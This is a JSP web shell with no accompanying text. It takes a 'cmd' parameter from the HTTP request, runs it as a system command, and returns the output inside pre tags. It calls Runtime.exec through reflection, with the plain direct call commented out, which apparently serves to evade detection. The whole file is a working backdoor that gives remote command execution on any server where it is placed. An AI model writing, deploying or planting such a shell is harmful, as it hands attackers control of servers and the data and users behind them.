<%@ page import="java.io.*" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page language="java" pageEncoding="UTF-8" %>

<%
    String cmd = request.getParameter("cmd");
//    Process pc = Runtime.getRuntime().exec(cmd);

    Class<?> cl = Class.forName("java.lang.Runtime");
    Method method1 = cl.getMethod("getRuntime");
    Object object1 = method1.invoke(null);
    Class cl2 = object1.getClass();
    Method method2 = cl2.getMethod("exec",String.class);
    Object object2 = method2.invoke(object1,cmd);
    Process pc = (Process)object2;


    InputStream in =pc.getInputStream();
    InputStreamReader  isr = new InputStreamReader(in);
    BufferedReader br = new BufferedReader(isr);

    StringBuilder a=new StringBuilder("");
    String s=null;
    while((s=br.readLine())!=null){
        a.append(s+"\n");
    }

    response.getWriter().println("<pre>");
    response.getWriter().println(a);
    response.getWriter().println("</pre>");

%>